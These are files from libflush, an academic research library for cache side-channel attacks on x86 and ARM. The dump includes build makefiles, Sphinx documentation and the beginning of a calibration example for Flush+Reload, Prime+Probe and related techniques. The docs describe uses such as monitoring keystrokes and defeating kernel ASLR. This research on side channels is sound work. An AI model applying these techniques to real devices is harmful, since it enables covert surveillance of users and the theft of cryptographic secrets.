uint64 time = libflush_reload_address(libflush_session, address);
```

## Example

A more sophisticated example using libflush can be found in the [example](example) directory. It implements
a calibration tool for the Flush+Reload, Prime+Probe, Evict+Reload, Flush+Flush and Prefetch attack. The example
can be compiled by running `make example` and executed by running `./example/build/<arch>/release/bin/example`. In addition the example can also be build with the `ndk-build` tool.

## License

[Licensed](LICENSE) under the zlib license.

## References

* [1] [ARMageddon: Cache Attacks on Mobile Devices - Lipp, Gruss, Spreitzer, Maurice, Mangard](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp)
* [2] [Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR - Gruss, Fogh, Maurice, Lipp, Mangard]()

```

`libflush/colors.mk`:

```mk
# See LICENSE file for license and copyright information

ifeq ($(COLOR),1)
# GCC diagnostics colors
DIAGNOSTICS_COLOR_AVAILABLE ?= $(shell ($(CC) -fdiagnostics-color=always -E - </dev/null >/dev/null 2>/dev/null && echo 1) || echo 0)
ifeq ($(DIAGNOSTICS_COLOR_AVAILABLE),1)
CPPFLAGS     += -fdiagnostics-color=always
endif

# colorful output
TPUT ?= /usr/bin/tput
TPUT_AVAILABLE ?= $(shell ${TPUT} -V 2>/dev/null)

ifdef TPUT_AVAILABLE
COLOR_NORMAL  = `$(TPUT) sgr0`
COLOR_ACTION  = `$(TPUT) bold``$(TPUT) setaf 3`
COLOR_COMMENT = `$(TPUT) bold``$(TPUT) setaf 2`
COLOR_BRACKET = `$(TPUT) setaf 4`
define colorecho
	@echo $(COLOR_BRACKET)" ["$(COLOR_ACTION)$1$(COLOR_BRACKET)"] "$(COLOR_COMMENT)$2$(COLOR_BRACKET) $(COLOR_NORMAL)
endef
else
define colorecho
	@echo " [$1]" $2
endef
endif
else
define colorecho
	@echo " [$1]" $2
endef
endif

```

`libflush/common.mk`:

```mk
# See LICENSE file for license and copyright information

ifeq "$(VERBOSE)" "0"
ECHO=@echo
QUIET=@
else
ECHO=@\#
QUIET=
endif

```

`libflush/config-arm.mk`:

```mk
# Define Android specific variables
ANDROID_NDK_PATH = /opt/android-ndk
ANDROID_TOOLCHAIN_BIN = ${ANDROID_NDK_PATH}/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin
ANDROID_SYSROOT = ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm

ANDROID_CC = ${ANDROID_TOOLCHAIN_BIN}/arm-linux-androideabi-gcc
ANDROID_CC_FLAGS = --sysroot=${ANDROID_SYSROOT}

ANDROID_INCLUDES = -I ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm/usr/include
ANDROID_CFLAGS = ${ANDROID_INCLUDES} -march=armv7-a -fPIE
ANDROID_LDFLAGS = ${ANDROID_INCLUDES} -march=armv7-a -fPIE

CC = ${ANDROID_CC} ${ANDROID_CC_FLAGS}
CFLAGS += ${ANDROID_CFLAGS}
LDFLAGS += -fPIE

```

`libflush/config-arm64.mk`:

```mk
# Define Android specific variables
ANDROID_NDK_PATH = /opt/android-ndk
ANDROID_TOOLCHAIN_BIN = ${ANDROID_NDK_PATH}/toolchains/aarch64-linux-android-4.9/prebuilt/linux-x86_64/bin
ANDROID_SYSROOT = ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm64

ANDROID_CC = ${ANDROID_TOOLCHAIN_BIN}/aarch64-linux-android-gcc
ANDROID_CC_FLAGS = --sysroot=${ANDROID_SYSROOT}

ANDROID_INCLUDES = -I ${ANDROID_NDK_PATH}/platforms/${ANDROID_PLATFORM}/arch-arm64/usr/include
ANDROID_CFLAGS = ${ANDROID_INCLUDES} -march=armv8-a -fPIE
ANDROID_LDFLAGS = ${ANDROID_INCLUDES} -march=armv8-a -fPIE

CC = ${ANDROID_CC} ${ANDROID_CC_FLAGS}
CFLAGS += ${ANDROID_CFLAGS} -flto
LDFLAGS += -fPIE -flto

```

`libflush/config.mk`:

```mk
# See LICENSE file for license and copyright information

PROJECT = libflush
ARCH = x86

LIBFLUSH_VERSION_MAJOR = 0
LIBFLUSH_VERSION_MINOR = 0
LIBFLUSH_VERSION_REV   = 1

VERSION = ${LIBFLUSH_VERSION_MAJOR}.${LIBFLUSH_VERSION_MINOR}.${LIBFLUSH_VERSION_REV}

# If the API changes, the API version and the ABI version have to be bumped.
LIBFLUSH_VERSION_API = 1

# If the ABI breaks for any reason, this has to be bumped.
LIBFLUSH_VERSION_ABI = 1

# Rules for the SOMAJOR and SOMINOR.
# Before a release check perform the following checks against the last release:
# * If a function has been removed or the paramaters of a function have changed
#   bump SOMAJOR and set SOMINOR to 0.
# * If any of the exported datastructures have changed in a incompatible way
# 	bump SOMAJOR and set SOMINOR to 0.
# * If a function has been added bump SOMINOR.

SOMAJOR = 1
SOMINOR = 0
SOVERSION = ${SOMAJOR}.${SOMINOR}

# pkg-config binary
PKG_CONFIG ?= pkg-config

# paths
PREFIX ?= /usr
LIBDIR ?= ${PREFIX}/lib
INCLUDEDIR ?= ${PREFIX}/include
DEPENDDIR=.depend
BUILDDIR ?= build/${ARCH}
BUILDDIR_RELEASE ?= ${BUILDDIR}/release
BUILDDIR_DEBUG ?= ${BUILDDIR}/debug
BUILDDIR_GCOV ?= ${BUILDDIR}/gcov
BINDIR ?= bin

# libs
FIU_INC ?= $(shell ${PKG_CONFIG} --cflags libfiu)
FIU_LIB ?= $(shell ${PKG_CONFIG} --libs libfiu) -ldl

INCS =
LIBS = -lm

# flags
CFLAGS += -std=gnu11 -pedantic -Wall -Wextra -fPIC -O3 $(INCS)

# linker flags
LDFLAGS += -fPIC

# debug
DFLAGS = -O0 -g

# compiler
CC ?= gcc

# archiver
AR ?= ar

# strip
SFLAGS ?= -s

# gcov & lcov
GCOV_CFLAGS=-fprofile-arcs -ftest-coverage -fno-inline -fno-inline-small-functions -fno-default-inline
GCOV_LDFLAGS=-fprofile-arcs
LCOV_OUTPUT=gcov
LCOV_EXEC=lcov
LCOV_FLAGS=--base-directory . --directory ${BUILDDIR_GCOV} --capture --rc \
					 lcov_branch_coverage=1 --output-file ${BUILDDIR_GCOV}/$(PROJECT).info
GENHTML_EXEC=genhtml
GENHTML_FLAGS=--rc lcov_branch_coverage=1 --output-directory ${LCOV_OUTPUT} ${BUILDDIR_GCOV}/$(PROJECT).info

# libfiu
WITH_LIBFIU ?= 0
FIU_RUN ?= fiu-run -x

# set to something != 0 if you want verbose build output
VERBOSE ?= 0

# enable colors
COLOR ?= 1

# android
ANDROID_PLATFORM ?= android-21

# thread safe
WITH_PTHREAD ?= 0

# pagemap access
HAVE_PAGEMAP_ACCESS ?= 1

# time sources
TIME_SOURCES = (register perf monotonic_clock thread_counter)
TIME_SOURCE ?= register

# use eviction instead of flush
USE_EVICTION ?= 0

# Define device
DEVICE_CONFIGURATION ?= default

```

`libflush/doc/Doxyfile`:

```
# See LICENSE file for license and copyright information

# General information
PROJECT_NAME          = libflush
OUTPUT_DIRECTORY      = ./_build/doxygen/
OUTPUT_LANGUAGE       = English
TAB_SIZE              = 2
EXTRACT_ALL           = NO
OPTIMIZE_OUTPUT_FOR_C = YES
DOXYFILE_ENCODING     = UTF-8
TYPEDEF_HIDES_STRUCT  = YES

# Warning and progress messages
QUIET                = YES
WARNINGS             = YES
WARN_IF_UNDOCUMENTED = YES

# Input files
INPUT         = ../libflush
FILE_PATTERNS = *.h *.c
RECURSIVE     = YES

# Output files
GENERATE_HTML  = NO
GENERATE_LATEX = NO
GENERATE_RTF   = NO
GENERATE_XML   = YES

```

`libflush/doc/Makefile`:

```
# See LICENSE file for license and copyright information
#
include ../config.mk
include ../common.mk
include ../colors.mk
include config.mk

DOXYGEN_SOURCES=$(wildcard ../libflush/*.h) Doxyfile
HTML_SOURCES=$(wildcard *.rst) conf.py

SPHINX_OPTS+=-d $(SPHINX_BUILDDIR)/doctrees

ifeq ($(shell which $(SPHINX_BIN) >/dev/null 2>&1; echo $$?), 1)
	$(error The '$(SPHINX_BIN)' command was not found.)
endif

all: html

clean:
	$(call colorecho,RM,"Clean documentation")
	$(QUIET)rm -rf $(SPHINX_BUILDDIR)/

$(SPHINX_BUILDDIR)/html/index.html: $(HTML_SOURCES) $(SPHINX_BUILDDIR)/doxygen/xml/index.xml
	$(call colorecho,DOC,"Build HTML documentation")
	$(QUIET)$(SPHINX_BIN) -b html $(SPHINX_OPTS) . $(SPHINX_BUILDDIR)/html

$(SPHINX_BUILDDIR)/doxygen/xml/index.xml: $(DOXYGEN_SOURCES)
	$(QUIET)mkdir -p $(SPHINX_BUILDDIR)
	$(call colorecho,DOC,"Run doxygen")
	$(QUIET)$(DOXYGEN_BIN) Doxyfile

# TODO: Make a better test for breathe and sphinx_rtd_theme
ifeq ($(shell which $(DOXYGEN_BIN) >/dev/null 2>&1 && $(PYTHON_BIN) -c "import breathe; import sphinx_rtd_theme" >/dev/null 2>&1; echo $$?), 0)
html: $(SPHINX_BUILDDIR)/html/index.html
else
html:
endif

.PHONY: clean html man all

```

`libflush/doc/api.rst`:

```rst
API
===

.. doxygenfile:: libflush/libflush.h

```

`libflush/doc/conf.py`:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# See LICENSE file for license and copyright information

import sphinx_rtd_theme

# -- General configuration ------------------------------------------------

extensions     = [
    'sphinx.ext.todo',
    'breathe'
]
source_suffix  = '.rst'
master_doc     = 'index'
templates_path = ['_templates']
exclude_patterns = ['_build']

pygments_style = 'sphinx'


# -- Project configuration ------------------------------------------------

project   = 'libflush'
copyright = '2015-2016'
version   = '0.0.0'
release   = '0.0.0'


# -- Options for HTML output ----------------------------------------------

html_theme        = 'sphinx_rtd_theme'
html_theme_path   = [sphinx_rtd_theme.get_html_theme_path()]
html_static_path  = ['_static']
htmlhelp_basename = 'libflushdoc'


# -- Options for breathe ---------------------------------------

breathe_projects = { "libflush": "_build/doxygen/xml" }
breathe_default_project = "libflush"
breathe_build_directory = "_build"
breathe_projects_source = {
    "libflush": "../"
}
breathe_domain_by_extension = {
    "h" : "c",
    "c" : "c"
}

```

`libflush/doc/config.mk`:

```mk
# See LICENSE file for license and copyright information

SPHINX_BIN      ?= sphinx-build
SPHINX_BUILDDIR  = _build
SPHINX_OPTS     ?=
DOXYGEN_BIN     ?= doxygen
# This needs to be the same python interpreter as used by sphinx-build
PYTHON_BIN      ?= python

```

`libflush/doc/example.rst`:

```rst
Example
=======

A more sophisticated example using libflush can be found in the
`example <example>`__ directory. It implements a calibration tool for
the Flush+Reload, Prime+Probe, Evict+Reload, Flush+Flush and Prefetch
attack. The example can be compiled by running ``make example`` and
executed by running ``./example/build/<arch>/release/bin/example``.
In addition the example can also be build with the ``ndk-build`` tool.

.. literalinclude:: ../example/main.c
  :language: c
  :linenos:

```

`libflush/doc/index.rst`:

```rst
libflush documentation
======================

libflush is a library to launch cache attacks on x86 as well as ARMv7 and ARMv8 architecture. It allows to easily implement attacks based on `Prime+Probe <https://eprint.iacr.org/2005/271.pdf/>`_, `Flush+Reload <https://eprint.iacr.org/2013/448.pdf/>`_, `Evict+Reload <https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-gruss.pdf/>`_, `Flush+Flush <http://arxiv.org/abs/1511.04594/>`_ and `Prefetch </>`_ attack techniques and thus offers a great playground for research and education purposes.

We have developed this library in the `ARMageddon: Cache Attacks on Mobile Devices <https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp/>`_ paper and used it to build covert-channels that outperform state-of-the-art covert channels on Android by several orders of magnitude. We utilized it to implement `cache template attacks <https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-gruss.pdf/>`_ that monitor tap and swipe events as well as keystrokes, and even derive the words entered on the touchscreen. Moreover, we used it to attack cryptographic primitives in Java and to monitor cache activity in the ARM TrustZone from the normal world. With the `Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR </>`_ paper we have extended the library to support prefetch attack techniques to obtain address information that can be used to defeat SMAP, SMEP and kernel ASLR.

The `ARMageddon: Cache Attacks on Mobile Devices <https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp/>`_ paper by Lipp, Gruss, Spreitzer, Maurice and Mangard will be published at the Usenix Security Symposium 2016. The
`Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR </>`_ paper by Gruss, Fogh, Maurice, Lipp and Mangard will be published at ACM Conference on Computer and Communications Security 2016.

.. toctree::
  :maxdepth: 2
  :numbered:

  installation
  usage
  example
  api

```

`libflush/doc/installation.rst`:

```rst
Installation
============

The library is shipped with a Makefile and can be compiled by running:

.. code-block:: sh

  make

The necessary header files and the shared and static build library can
be installed on the host system:

.. code-block:: sh

  make install

In addition we provide a debug build that can be initiated by calling
``make debug`` as well as a simple test suite that can be run by calling
``make test``. Code coverage of the test suite can be determined by
running ``make gcov``.

Additionally we provide an ``Android.mk`` and an ``Application.mk`` file
that can be used to build the library with the `Android
NDK <https://developer.android.com/ndk/index.html>`__ toolset:

.. code-block:: sh

  ndk-build NDK_APPLICATION_MK=`pwd`/Application.mk NDK_PROJECT_PATH=`pwd`

Dependencies
~~~~~~~~~~~~

libflush does not require any dependencies except for running the test suite or
building the documentation. However, by default it uses the toolchains provided
by the Android NDK if built for *armv7* or *armv8*.

-  `Android NDK <https://developer.android.com/ndk/index.html>`__ -
   Android Native Development Kit (optional for ARM builds)
-  `check <https://libcheck.github.io/check/>`__ - Unit Testing
   Framework for C (optional for test cases)
-  `libfiu <https://blitiri.com.ar/p/libfiu/>`__ - Fault injection in
   userspace (optional for test cases)
-  `doxygen <www.doxygen.org>`__ (optional, for HTML documentation)
-  `Sphinx <http://www.sphinx-doc.org>`__ (optional, for HTML
   documentation)
-  `sphinx\_rtd\_theme <https://github.com/snide/sphinx_rtd_theme>`__
   (optional, for HTML documentation)
-  `breathe <https://github.com/michaeljones/breathe>`__ (optional, for
   HTML documentation)

Build Configuration
-------------------

The build system makes use of several configuration files. The
parameters can be adjusted by modifying the files accordingly or by
passing them to make (``make ARCH=x86``). The most important properties
are the following:

-  ``ARCH``: Defines the target architecture.

   -  *x86* (default) - Support for *i386* and *x86\_64*
   -  *armv7* - Support for ARMv7
   -  *armv8* - Support for ARMv8

-  ``USE_EVICTION``: Use eviction instead of flush instruction in flush
   based functions. Required for devices that do not expose a flush
   instruction. (default: 0, enabled by default for _armv7_ architecture)
-  ``DEVICE_CONFIGURATION``: Defines cache and eviction based properties
   for the target device if eviction is used. See
   *libflush/eviction/strategies* for
   example device configurations.

   -  *default* (default) - Default device configuration.
   -  *alto45* - Alcatel OneTouch POP 2
   -  *bacon* - OnePlus One
   -  *mako* - Nexus 4
   -  *hammerhead* - Nexus 5
   -  *tilapia* - Nexus 7
   -  *manta* - Nexus 10
   -  *zeroflte* - Samsung Galaxy S6

-  ``TIME_SOURCE``: Gives the possibility to use different timing
   sources to measure the execution time. Depending on the available
   privileges, one might want to change the timing source.

   -  *register* - Performance register / Time-stamp counter (default)
   -  *perf* - Perf interface
   -  *monotonic\_clock* - Monotonic clock
   -  *thread\_counter* - Dedicated thread counter

-  ``WITH_PTHREAD``: Build with pthread support.
-  ``HAVE_PAGEMAP_ACCESS``: Defines if access to */proc/self/pagemap* is
   granted.

If the library is build for the ARMv7 or the ARMv8 architecture the
build system uses the ``config-arm.mk`` or
``config-arm64.mk`` configuration file. By default the
build system makes use of the toolchains provided by the `Android
NDK <https://developer.android.com/ndk/index.html>`__, thus its possible
that the installation path of the NDK needs to be modified:

-  ``ANDROID_NDK_PATH``: Path to the installation of the Android NDK.

   -  */opt/android-ndk* (default)

-  ``ANDROID_PLATFORM``: Defines the used Android platform that is used.

   -  *android-21* (default)

If you prefer to use a different toolchain/compiler, feel free to change
``CC`` and other properties accordingly.

Advanced Configuration
----------------------

Eviction strategy
^^^^^^^^^^^^^^^^^

If eviction is used, libflush uses the parameters defined by the
``DEVICE_CONFIGURATION``. The device configuration is represented by a header
file in *libflush/eviction/strategies* and is structured as the following:

**Cache specific configuration**

- ``NUMBER_OF_SETS``: The number of sets in the cache
- ``LINE_LENGTH``: The line length
- ``LINE_LENGTH_LOG2``: The log base 2 of the line length

**Eviction strategy configuration**

- ``ES_EVICTION_COUNTER``: Length of the loop
- ``ES_NUMBER_OF_ACCESSES_IN_LOOP``: Number of accesses of an address in one loop round
- ``ES_DIFFERENT_ADDRESSES_IN_LOOP``: Number of different addresses in one loop round

```

`libflush/doc/requirements.txt`:

```txt
alabaster==0.7.9
Babel==2.3.4
breathe==4.2.0
docutils==0.12
imagesize==0.7.1
Jinja2==2.8
MarkupSafe==0.19
Pygments==2.1.3
pytz==2016.6.1
six==1.10.0
snowballstemmer==1.2.1
Sphinx==1.4.5
sphinx-rtd-theme==0.1.9

```

`libflush/doc/usage.rst`:

```rst
Usage
=====

The following sections illustrate the usage of libflush. For a complete overview
of the available functions please refer to the :doc:`api`.

Initialization and termination
------------------------------

In order to use libflush one needs to include the header file and call
the ``libflush_init`` to initialize the library. In the end
``libflush_terminate`` needs to be called to clean-up.

.. code-block:: c

    #include <libflush.h>

    int main(int argc, char* argv[]) {
        // Initialize libflush
        libflush_session_t* libflush_session;
        if (libflush_init(&libflush_session, NULL) == false) {
            return -1;
        }
        
        // Use libflush...
        
        // Terminate libflush
        if (libflush_terminate(libflush_session) == false) {
            return -1;
        }
        
        return 0;
    }

and link against the library:

::

    gcc example.c `pkg-config --libs libflush`

Flush or evict an address
-------------------------

To evict an address from the cache to the main memory, a dedicated flush
instruction (if available) or eviction can be used.

.. code-block:: c

    void* address = &foo;

    // Use the flush instruction (if possible)
    libflush_flush(libflush_session, address);

    // Use eviction
    libflush_evict(libflush_session, address);

Get timing information
----------------------

To retrieve a time stamp depending on the used time source can be
achieved with the following function.

.. code-block:: c

    uint64 time = libflush_get_timing(libflush_session);

In addition wrapper functions to measure the execution time of different
functions are given.

.. code-block:: c

    uint64 time = libflush_reload_address(libflush_session, address);

```

`libflush/example/Android.mk`:

```mk
LOCAL_PATH := $(call my-dir)

include $(CLEAR_VARS)
include ../config.mk
LOCAL_MODULE := libflush
LOCAL_EXPORT_C_INCLUDES := $(LOCAL_PATH)/../
LOCAL_SRC_FILES := ../obj/local/$(TARGET_ARCH_ABI)/libflush.a
include $(PREBUILT_STATIC_LIBRARY)

include $(CLEAR_VARS)
LOCAL_CFLAGS += ${CFLAGS}
LOCAL_MODULE := example
LOCAL_SRC_FILES := main.c
LOCAL_SHARED_LIBRARIES := libflush
include $(BUILD_EXECUTABLE)

```

`libflush/example/Application.mk`:

```mk
# Use alternate build script
APP_BUILD_SCRIPT := Android.mk

# This variable contains the name of the target Android platform.
APP_PLATFORM := android-21

# By default, the NDK build system generates machine code for the armeabi ABI.
# This machine code corresponds to an ARMv5TE-based CPU with software floating
# point operations. You can use APP_ABI to select a different ABI.
#
# See https://developer.android.com/ndk/guides/application_mk.html
APP_ABI := x86_64 armeabi-v7a arm64-v8a

```

`libflush/example/Makefile`:

```
# See LICENSE file for license and copyright information

include ../config.mk
include ../common.mk
include ../colors.mk
include config.mk

PROJECT = example
SOURCE  = $(wildcard *.c)
OBJECTS = $(addprefix ${BUILDDIR_RELEASE}/,${SOURCE:.c=.o})
OBJECTS_DEBUG = $(addprefix ${BUILDDIR_DEBUG}/,${SOURCE:.c=.o})

ifeq "${ARCH}" "x86"
	LDFLAGS += -pthread
endif

ifeq "${ARCH}" "armv7"
	include ../config-arm.mk
	include config-arm.mk
endif

ifeq "${ARCH}" "armv8"
	include ../config-arm64.mk
	include config-arm.mk
endif

all: options ${PROJECT}

options:
	${ECHO} ${PROJECT} build options:
	${ECHO} "CFLAGS  = ${CFLAGS}"
	${ECHO} "LDFLAGS = ${LDFLAGS}"
	${ECHO} "LIBS    = ${LIBS}"
	${ECHO} "CC      = ${CC}"

# release build

${OBJECTS}: ../config.mk config.mk

${BUILDDIR_RELEASE}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $(abspath $@))
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} -o $@ $< -MMD -MF ${DEPENDDIR}/$(abspath $@).dep

${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}: ${OBJECTS} dependencies
	$(call colorecho,CC,$@)
	@mkdir -p ${BUILDDIR_RELEASE}/${BINDIR}
	$(QUIET)${CC} ${SFLAGS} ${LDFLAGS} \
		-o ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT} ${OBJECTS} ${LIBS} ${LIBFLUSH_RELEASE}

${PROJECT}: ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}

run: ${PROJECT}
		${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}

dependencies:
	$(QUIET)${MAKE} WITH_LIBFIU=${WITH_LIBFIU} -C .. release

# debug build

${OBJECTS_DEBUG}: ../config.mk config.mk

${BUILDDIR_DEBUG}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $(abspath $@))
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} -o $@ $< -MMD -MF ${DEPENDDIR}/$(abspath $@).dep

${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}: ${OBJECTS_DEBUG} dependencies-debug
	$(call colorecho,CC,$@)
	@mkdir -p ${BUILDDIR_DEBUG}/${BINDIR}
	$(QUIET)${CC} ${SFLAGS} ${LDFLAGS} \
		-o ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT} ${OBJECTS_DEBUG} ${LIBS} ${LIBFLUSH_DEBUG}

debug: ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

run-debug: debug
		${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

dependencies-debug:
	$(QUIET)${MAKE} WITH_LIBFIU=1 -C .. debug

# debugging

gdb: debug
	$(QUIET)${GDB} ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

# clean

clean:
	$(QUIET)rm -rf ${PROJECT}.so ${OBJECTS} .depend ${PROJECT}.gcda ${PROJECT}.gcno

.PHONY: all options clean debug run dependencies dependencies-debug gdb

-include $(wildcard .depend/*.dep)

```

`libflush/example/config-arm.mk`:

```mk
# See LICENSE file for license and copyright information

LDFLAGS += -pie

```

`libflush/example/config.mk`:

```mk
# See LICENSE file for license and copyright information

INCS += -I../

LIBFLUSH_RELEASE=../${BUILDDIR_RELEASE}/libflush.a
LIBFLUSH_DEBUG=../${BUILDDIR_DEBUG}/libflush.a
LIBFLUSH_GCOV=../${BUILDDIR_GCOV}/libflush.a

```

`libflush/example/main.c`:

```c
 /* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <inttypes.h>
#include <getopt.h>
#include <sched.h>
#include <sys/mman.h>

#include <libflush/libflush.h>

#define HISTOGRAM_SIZE 300
#define HISTOGRAM_ENTRIES 50000
#define HISTOGRAM_SCALE 5
#define HISTOGRAM_THRESHOLD 100

#define BIND_TO_CPU 0
#define BIND_THREAD_TO_CPU 1

#define MIN(a, b) ((a) > (b)) ? (b) : (a)
#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))
#define _STR(x) #x
#define STR(x) _STR(x)

static void
print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS]\n", argv[0]);
  fprintf(stdout, "\t-f, -function <value>\t Function (default: flush_reload)\n");
  fprintf(stdout, "\t-c, -cpu <value>\t Bind to cpu (default: " STR(BIND_TO_CPU) ")\n");
  fprintf(stdout, "\t-t, -thread-cpu <value>\t Bind thread to cpu (only for thread counter) (default: " STR(BIND_THREAD_TO_CPU) ")\n");
  fprintf(stdout, "\t-l, -logfile <value>\t Logfile in csv format\n");
  fprintf(stdout, "\t-s, -size <value>\t Histogram size (default: " STR(HISTOGRAM_SIZE) ")\n");
  fprintf(stdout, "\t-n, -entries <value>\t Number of histogram entries (default: " STR(HISTOGRAM_ENTRIES) ")\n");
  fprintf(stdout, "\t-x, -scale <value>\t Histogram scale (default: " STR(HISTOGRAM_SCALE) ")\n");
  fprintf(stdout, "\t-z, -threshold <value>\t Histogram threshold (default: " STR(HISTOGRAM_THRESHOLD) ")\n");
  fprintf(stdout, "\t-h, -help\t\t Help page\n");
}

typedef void (*hit_function_t)(libflush_session_t* libflush_session, void*
    address,  size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);

typedef void (*miss_function_t)(libflush_session_t* libflush_session, void*
    address, size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);

typedef struct function_mapping_s {
  const char* name;
  hit_function_t hit_function;
  miss_function_t miss_function;
} function_mapping_t;

static void flush_reload_hit(libflush_session_t* libflush_session, void*
    address, size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);
static void flush_reload_miss(libflush_session_t* libflush_session, void*
    address, size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);
static void prime_probe_hit(libflush_session_t* libflush_session, void*
    address, size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);
static void prime_probe_miss(libflush_session_t* libflush_session, void*
    address, size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);
static void evict_reload_hit(libflush_session_t* libflush_session, void*
    address, size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);
static void evict_reload_miss(libflush_session_t* libflush_session, void*
    address, size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);
static void flush_flush_hit(libflush_session_t* libflush_session, void* address,
    size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);
static void flush_flush_miss(libflush_session_t* libflush_session, void*
    address, size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);
static void prefetch_hit(libflush_session_t* libflush_session, void* address,
    size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);
static void prefetch_miss(libflush_session_t* libflush_session, void* address,
    size_t runs, size_t* histogram, size_t histogram_size, size_t
    histogram_scale);

function_mapping_t function_mapping[] = {
  { "flush_reload", flush_reload_hit, flush_reload_miss },
  { "prime_probe",  prime_probe_hit,  prime_probe_miss },
  { "evict_reload", evict_reload_hit, evict_reload_miss },
  { "flush_flush",  flush_flush_hit,  flush_flush_miss },
  { "prefetch",     prefetch_hit,     prefetch_miss },
};

int
main(int argc, char* argv[])
{
  /* Define parameters */
  size_t cpu = BIND_TO_CPU;
  size_t thread_cpu = BIND_THREAD_TO_CPU;
  FILE* logfile = NULL;
  hit_function_t hit_function = flush_reload_hit;
  miss_function_t miss_function = flush_reload_miss;
  size_t histogram_size = HISTOGRAM_SIZE;
  size_t histogram_scale = HISTOGRAM_SCALE;
  size_t histogram_entries = HISTOGRAM_ENTRIES;
  size_t histogram_threshold = HISTOGRAM_THRESHOLD;

  /* Parse arguments */
  static const char* short_options = "f:c:t:l:s:n:x:z:h";
  static struct option long_options[] = {
    {"function",        required_argument, NULL, 'f'},
    {"cpu",             required_argument, NULL, 'c'},
    {"thread-cpu",      required_argument, NULL, 't'},
    {"logfile",         required_argument, NULL, 'l'},
    {"size",            required_argument, NULL, 's'},
    {"entries",         required_argument, NULL, 'n'},
    {"scale",           required_argument, NULL, 'x'},
    {"threshold",       required_argument, NULL, 'z'},
    {"help",            no_argument,       NULL, 'h'},
    { NULL,             0, NULL, 0}
  };

  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch (c) {
      case 'c':
        cpu = atoi(optarg);
        if (cpu >= number_of_cpus) {
          fprintf(stderr, "Error: CPU %zu is not available.\n", cpu);
          return -1;
        }
        break;
      case 't':
        thread_cpu = atoi(optarg);
        if (thread_cpu >= number_of_cpus) {
          fprintf(stderr, "Error: CPU %zu is not available.\n", thread_cpu);
          return -1;
        }
        break;
      case 'l':
        logfile = fopen(optarg, "w+");
        if (logfile == NULL) {
          fprintf(stderr, "Error: Could not open logfile '%s'\n", optarg);
          return -1;
        }
        fprintf(logfile, "Time,Hit,Miss\n");
        break;
      case 'f':
        {
          bool found = false;
          for (size_t i = 0; i < LENGTH(function_mapping); i++) {
            if (strcmp(optarg, function_mapping[i].name) == 0) {
              hit_function = function_mapping[i].hit_function;
              miss_function = function_mapping[i].miss_function;
              found = true;
              break;
            }
          }

          if (found == false) {
            fprintf(stderr, "Error: Invalid function mapping '%s'\n", optarg);
            return -1;
          }
        }
        break;
      case 's':
        histogram_size = atoi(optarg);
        break;
      case 'n':
        histogram_entries = atoi(optarg);
        break;
      case 'x':
        histogram_scale = atoi(optarg);
        break;
      case 'z':
        histogram_threshold = atoi(optarg);
        break;
      case 'h':
        print_help(argv);
        return 0;
      case ':':
        fprintf(stderr, "Error: option `-%c' requires an argument\n", optopt);
        break;
      case '?':
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }

  /* Bind to CPU */
  cpu = cpu % number_of_cpus;
  thread_cpu = thread_cpu % number_of_cpus;

  if (libflush_bind_to_cpu(cpu) == false) {
    fprintf(stderr, "Warning: Could not bind to CPU: %zu\n", cpu);
  }

  /* Initialize libflush */
  libflush_session_args_t args = { 0 };
  args.bind_to_cpu = thread_cpu;
  libflush_session_t* libflush_session;
  if (libflush_init(&libflush_session, &args) == false) {
    fprintf(stderr, "Error: Could not initialize libflush\n");
    return -1;
  }

  /* Allocate histograms */
  size_t* hit_histogram = calloc(histogram_size, sizeof(size_t));
  if (hit_histogram == NULL) {
    fprintf(stderr, "Error: Could not allocate memory for histogram.\n");
    return -1;
  }

  size_t* miss_histogram = calloc(histogram_size, sizeof(size_t));
